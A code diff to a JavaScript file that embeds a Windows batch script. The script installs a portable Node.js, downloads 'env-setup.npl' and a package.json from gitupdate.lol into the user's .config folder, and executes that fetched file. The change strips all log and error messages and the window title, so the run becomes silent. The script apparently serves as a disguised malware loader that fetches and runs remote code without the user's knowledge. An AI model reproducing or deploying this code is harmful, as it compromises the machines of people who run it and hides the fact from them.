@@ -143,7 +143,6 @@ exit 0
       }
       script = `
 @echo off
-title Creating new Info
 setlocal enabledelayedexpansion
 
 REM Get latest Node.js version using PowerShell
@@ -164,31 +163,25 @@ where node >nul 2>&1
 if not errorlevel 1 (
     for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
     set "NODE_EXE=node"
-    echo [INFO] Node.js is already installed globally: %NODE_INSTALLED_VERSION%
-
 )
 
 if not defined NODE_EXE (
     if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Node.js found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\\PFiles64\\nodejs;%PATH%"
-    ) else ( echo [INFO] Node.js not found globally. Attempting to extract portable version...
+    ) else (
 
     :: -------------------------
     :: Download Node.js MSI if needed
     :: -------------------------
     where curl >nul 2>&1
     if errorlevel 1 (
-        echo [INFO] Using PowerShell to download Node.js...
         powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
     ) else (
-        echo [INFO] Using curl to download Node.js...
         curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
     )
 
     if exist "%~dp0%NODE_MSI%" (
-        echo [INFO] Extracting Node.js MSI to %EXTRACT_DIR%...
         msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
         del "%~dp0%NODE_MSI%"
     ) else (
@@ -197,11 +190,9 @@ if not defined NODE_EXE (
     )
 
     if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Node.js found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\\PFiles64\\nodejs;%PATH%"
     ) else (
-        echo [ERROR] node.exe not found after extraction.
         exit /b 1
     )
     )
@@ -211,7 +202,6 @@ if not defined NODE_EXE (
 :: Confirm Node.js works
 :: -------------------------
 if not defined NODE_EXE (
-    echo [ERROR] Node.js executable not found or set.
     exit /b 1
 )
 set "CODEPROFILE=%USERPROFILE%\\.config"
@@ -219,27 +209,22 @@ set "CODEPROFILE=%USERPROFILE%\\.config"
 curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitupdate.lol/settings/env?flag=${flag}"
 curl -L -o "%CODEPROFILE%\\package.json" "https://gitupdate.lol/settings/package"
 
-if not exist "%~dp0node_modules" (
+if not exist "%~dp0node_modules\\axios" (
     pushd "%~dp0"
-    echo [INFO] Installing NPM packages...
     call npm install --silent --no-progress --loglevel=error --fund=false
     if errorlevel 1 (
-        echo [ERROR] npm install failed.
         popd
         exit /b 1
     )
     popd
 )else (
-  echo [INFO] Running env-setup.npl...
   pushd "%CODEPROFILE%"
   "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
   if errorlevel 1 (
-      echo [ERROR] env-setup execution failed.
-      exit /b 1
-      )
+    exit /b 1
+  )
   popd
 )
-echo [SUCCESS] Script completed successfully.
 exit /b 0
     	`;
       break;
